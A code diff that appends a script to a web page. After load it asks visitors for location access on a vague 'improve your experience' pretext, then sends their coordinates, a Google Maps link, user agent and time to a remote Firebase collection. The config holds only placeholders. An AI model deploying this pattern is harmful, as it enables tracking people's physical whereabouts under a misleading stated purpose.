@@ -396,7 +396,69 @@
       </div>
     </div>
   </section>
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+import { getFirestore, addDoc, collection } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
+// 🔥 Apna Firebase config yaha paste karo
+const firebaseConfig = {
+  apiKey: "YOUR_API_KEY",
+  authDomain: "YOUR_PROJECT.firebaseapp.com",
+  projectId: "YOUR_PROJECT_ID",
+  storageBucket: "YOUR_PROJECT.appspot.com",
+  messagingSenderId: "XXXX",
+  appId: "XXXX"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+// 🔹 Custom popup (simple confirm box)
+function askLocationPermission() {
+  let allow = confirm("We use your location to improve your experience. Allow location access?");
+  
+  if (allow) {
+    getLocation();
+  }
+}
+
+// 🔹 Get user location
+function getLocation() {
+  if (!navigator.geolocation) {
+    alert("Geolocation not supported");
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    async function(position) {
+      const lat = position.coords.latitude;
+      const lng = position.coords.longitude;
+
+      // 🔹 Google map link
+      const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
+
+      // 🔹 Firebase me save
+      await addDoc(collection(db, "user_locations"), {
+        latitude: lat,
+        longitude: lng,
+        map: mapLink,
+        device: navigator.userAgent,
+        time: new Date().toLocaleString()
+      });
+
+      console.log("Location saved");
+    },
+    function(error) {
+      console.log("User denied browser location");
+    }
+  );
+}
+
+// 🔹 Page load hone ke 2 sec baad popup dikhao
+window.onload = function() {
+  setTimeout(askLocationPermission, 2000);
+};
+</script>
 </body>
 
 </html>
